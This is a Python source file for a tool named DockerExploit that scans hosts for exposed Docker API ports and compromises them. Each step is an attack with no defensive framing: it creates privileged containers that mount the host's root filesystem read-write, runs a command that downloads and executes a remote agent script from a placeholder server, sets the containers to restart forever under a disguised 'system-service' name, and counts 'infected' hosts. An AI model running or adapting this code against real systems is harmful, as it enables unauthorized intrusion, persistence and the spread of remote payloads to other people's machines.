import aiohttp
import asyncio
import json
from typing import List, Dict, Set
import time

class DockerExploit:
    def __init__(self):
        self.docker_ports = [2375, 2376, 2377]
        self.infected_hosts: Set[str] = set()
        
    async def scan_docker_api(self, target: str) -> tuple[bool, int]:
        """Check if Docker API is exposed"""
        for port in self.docker_ports:
            url = f"http://{target}:{port}/version"
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            data = await response.json()
                            if 'ApiVersion' in data:
                                return True, port
            except:
                continue
        return False, None
    
    async def inject_container(self, target: str, port: int) -> bool:
        """Inject malicious container via Docker API"""
        container_config = {
            "Image": "alpine:latest",
            "Cmd": ["/bin/sh", "-c", "wget http://your-server/agent.sh -O /tmp/agent.sh && sh /tmp/agent.sh"],
            "HostConfig": {
                "Binds": ["/:/host:rw"],
                "Privileged": True,
                "RestartPolicy": {"Name": "always"}
            },
            "Name": f"system-service-{int(time.time())}"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                # Create container
                create_url = f"http://{target}:{port}/containers/create"
                async with session.post(create_url, json=container_config) as response:
                    if response.status in [201, 200]:
                        container = await response.json()
                        container_id = container['Id']
                        
                        # Start container
                        start_url = f"http://{target}:{port}/containers/{container_id}/start"
                        async with session.post(start_url) as start_response:
                            if start_response.status == 204:
                                self.infected_hosts.add(target)
                                return True
        except Exception as e:
            pass
        
        return False
    
    async def scale_containers(self, target: str, port: int, replicas: int = 5) -> int:
        """Create multiple container replicas"""
        tasks = []
        for i in range(replicas):
            tasks.append(self.inject_container(target, port))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        successful = sum(1 for result in results if result is True)
        return successful
    
    async def exploit_target(self, target: str) -> Dict[str, any]:
        """Complete exploitation workflow for a target"""
        result = {
            'target': target,
            'vulnerable': False,
            'exploited': False,
            'containers_deployed': 0,
            'port': None
        }
        
        # Check if Docker API is exposed
        is_vulnerable, port = await self.scan_docker_api(target)
        result['vulnerable'] = is_vulnerable
        result['port'] = port
        
        if is_vulnerable:
            # Attempt exploitation
            success = await self.inject_container(target, port)
            result['exploited'] = success
            
            if success:
                # Deploy additional containers
                additional = await self.scale_containers(target, port, 3)
                result['containers_deployed'] = 1 + additional
        
        return result
    
    def get_infected_count(self) -> int:
        """Get total number of infected hosts"""
        return len(self.infected_hosts)